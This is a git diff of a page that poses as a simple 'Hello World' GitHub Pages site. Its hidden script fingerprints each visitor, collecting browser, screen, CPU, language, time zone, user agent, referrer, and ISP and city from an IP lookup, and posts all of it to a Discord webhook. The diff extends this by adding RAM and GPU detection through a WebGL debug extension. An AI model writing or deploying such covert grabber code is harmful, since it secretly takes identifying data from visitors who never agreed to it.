@@ -23,12 +23,10 @@
   // Get browser info with modern fallback
   let browserInfo;
   if (navigator.userAgentData) {
-    // Chromium-based browsers
     browserInfo = navigator.userAgentData.brands
       .map(b => `${b.brand} v${b.version}`)
       .join(", ");
   } else {
-    // Fallback for non-Chromium browsers
     const ua = navigator.userAgent;
     if (ua.includes("Firefox")) browserInfo = "Firefox";
     else if (ua.includes("Safari") && !ua.includes("Chrome")) browserInfo = "Safari";
@@ -49,6 +47,26 @@
 
   // Get CPU cores
   const cpuCores = navigator.hardwareConcurrency || "Unknown";
+
+  // Get RAM in GB
+  const ramGB = navigator.deviceMemory || "Unknown";
+
+  // Detect GPU
+  function getGPU() {
+    try {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      if (!gl) return "Unknown";
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      if (debugInfo) {
+        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      }
+      return "Unknown";
+    } catch (e) {
+      return "Unknown";
+    }
+  }
+  const gpu = getGPU();
 
   // Get browser language
   const browserLang = navigator.language || "Unknown";
@@ -76,7 +94,7 @@
       const isp = data.org || "Unknown";
       const location = `${data.city || "Unknown"}, ${data.region || "Unknown"}, ${data.country || "Unknown"}`;
 
-      // Send all info to Discord webhook using an improved embed
+      // Send all info to Discord webhook using a pretty embed
       return fetch(WEBHOOK_URL, {
         method: "POST",
         headers: {
@@ -102,13 +120,17 @@
                 // Referrer
                 { name: "🔗 Referrer", value: referrer, inline: false },
 
-                // Technical info
+                // Hardware info
                 { name: "🖼️ Screen Resolution", value: screenRes, inline: true },
                 { name: "🧠 CPU Cores", value: cpuCores.toString(), inline: true },
+                { name: "💾 RAM (GB)", value: ramGB.toString(), inline: true },
+                { name: "🎮 GPU", value: gpu, inline: true },
+
+                // Other info
                 { name: "🌐 Language", value: browserLang, inline: true },
                 { name: "⏰ Time Zone", value: timeZone, inline: true },
 
-                // User-Agent last
+                // User-Agent last so it doesn’t clutter
                 { name: "📝 User-Agent", value: userAgent, inline: false }
               ],
               timestamp: new Date().toISOString(),
@@ -128,10 +150,10 @@
 
 
 
+
 </head>
 <body>
   <h1>Hello World! </h1>
   <p>Welcome to my first GitHub Pages website.</p>
 </body>
 </html>
-
